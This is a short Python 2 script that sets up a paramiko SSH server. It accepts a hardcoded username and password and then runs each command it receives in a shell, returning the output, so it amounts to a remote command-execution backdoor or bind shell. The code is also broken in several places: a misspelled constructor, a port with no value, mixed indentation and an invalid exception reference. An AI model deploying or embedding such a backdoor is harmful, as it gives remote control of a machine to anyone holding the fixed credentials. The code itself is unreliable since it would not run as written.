#!/usr/bin/python

import socket
import paramiko
import threading
import sys
import subprocess

#Host RSA Key, can use openssl to generate one
host_key = paramiko.RSAKey(filename='test_rsa.key')
#log file
#paramiko.util.log_to_file('demo_server.log')
class Server (paramiko.ServerInterface):
	#Start a thread for the connection
	def _init_(self):
		self.event = threading.Event()
	#Did they complete the handshake?
	def check_channel_request(self, kind, chanid):
		if kind == 'session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
	#Authentication function
	def check_auth_password(self, username, password):
		if (username == 'pylove' and password == 'whiskeytango'):
			return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED
	#Allow a shell
	def check_channel_shell_request(self, channel):
          	return True
	#Define the shell
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        	return True
#Where to bind
server = ''
port = 

try:
	#Define the ip and transport
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind((server,port))
	sock.listen(10)
	print '[+] Listening for connection'
	client, addr = sock.accept()


except Exception, e:
	print '[-] Listen failed: ' + str(e)
	sys.exit(1)

print '[+] Recieved a connection'

#Paramiko setup to allow client
sshSession = paramiko.Transport(client)
sshSession.add_server_key(host_key)
#initialize a server
server = Server()
try:
	sshSession.start_server(server=server)
except sshSession.SSHException, x:
	print '[-] SSH negotiation failed.'

#Create a channel 
chan = sshSession.accept(20)
print '[+] Send the commands!'
while True:	
	chan.send('\n\rEnter Command: ')
	command = ''
	singleChar = ''
	#Get chars until carriage return
	while singleChar != '\r':
		singleChar = chan.recv(1024)
		chan.send(singleChar)
		command += singleChar
	command = command.strip('\r')
	#send a newline to make it look nice
	chan.send('\n')
	#check to see if they want to quit
	if (command == 'exit'):
		break
	try:
		#try their command and return the output
		output = subprocess.check_output(command, shell=True)
		chan.send(output)
	except:
		print "Bad command"
		pass 

sys.exit(1)
